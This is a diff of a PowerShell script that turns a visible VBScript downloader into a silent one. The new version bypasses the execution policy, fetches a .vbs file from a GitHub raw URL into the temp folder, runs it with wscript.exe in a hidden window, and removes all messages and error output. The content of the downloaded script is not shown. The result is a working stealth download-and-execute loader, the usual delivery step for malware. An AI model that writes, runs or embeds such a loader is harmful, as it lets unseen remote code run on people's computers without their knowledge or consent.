@@ -1,53 +1,40 @@
 <#
 .SYNOPSIS
-    User-Friendly VBScript Executor
+    Silent VBScript Executor
 .DESCRIPTION
-    Downloads and runs a VBScript with clear path visibility
+    Downloads and executes a VBScript without any UI interruptions
 #>
 
-# Set execution policy for current session only
+# Allow script execution temporarily
 Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction SilentlyContinue
 
 # Configuration
 $VbsUrl = "https://github.com/seunoshino/myapp-downloads/raw/main/100%25.vbs"
-$Destination = "$env:TEMP\MyApp\script.vbs"  # Standard temp location
+$Destination = "$env:TEMP\MyApp\script.vbs"
 
-# Create folder and show location
-Write-Host "Creating working directory..."
-$workingDir = "$env:TEMP\MyApp"
-if (-not (Test-Path $workingDir)) {
-    New-Item -ItemType Directory -Path $workingDir -Force | Out-Null
+# Ensure working directory exists
+if (-not (Test-Path "$env:TEMP\MyApp")) {
+    $null = New-Item -ItemType Directory -Path "$env:TEMP\MyApp" -Force
 }
 
-Write-Host "Files will be saved to: $workingDir" -ForegroundColor Cyan
-Write-Host "Full path: $Destination" -ForegroundColor Cyan
-
-# Download and execute
+# Download and execute silently
 try {
-    # Download with progress display
-    Write-Host "`nDownloading script..." -ForegroundColor Yellow
+    # Download file
     (New-Object System.Net.WebClient).DownloadFile($VbsUrl, $Destination)
     
-    # Verify download
-    if (Test-Path $Destination) {
-        Write-Host "Download successful!" -ForegroundColor Green
-        Write-Host "File saved to: $Destination" -ForegroundColor Cyan
-        
-        # Open containing folder (optional)
-        Start-Process "explorer.exe" -ArgumentList "/select,`"$Destination`""
-        
-        # Execute script
-        Write-Host "`nStarting script execution..." -ForegroundColor Yellow
-        Start-Process "wscript.exe" -ArgumentList "`"$Destination`""
-    }
-    else {
-        Write-Host "Download failed - file not found" -ForegroundColor Red
-    }
+    # Execute without any UI interruptions
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = "wscript.exe"
+    $psi.Arguments = "`"$Destination`""
+    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    $psi.CreateNoWindow = $true
+    
+    $process = [System.Diagnostics.Process]::Start($psi)
+    
+    # Optional: Wait for completion (remove if not needed)
+    $process.WaitForExit()
 }
 catch {
-    Write-Host "Error: $_" -ForegroundColor Red
+    # Minimal error handling
+    exit 1
 }
-
-# Show final location again
-Write-Host "`nYou can always find the script at:" -ForegroundColor Cyan
-Write-Host $Destination -ForegroundColor White
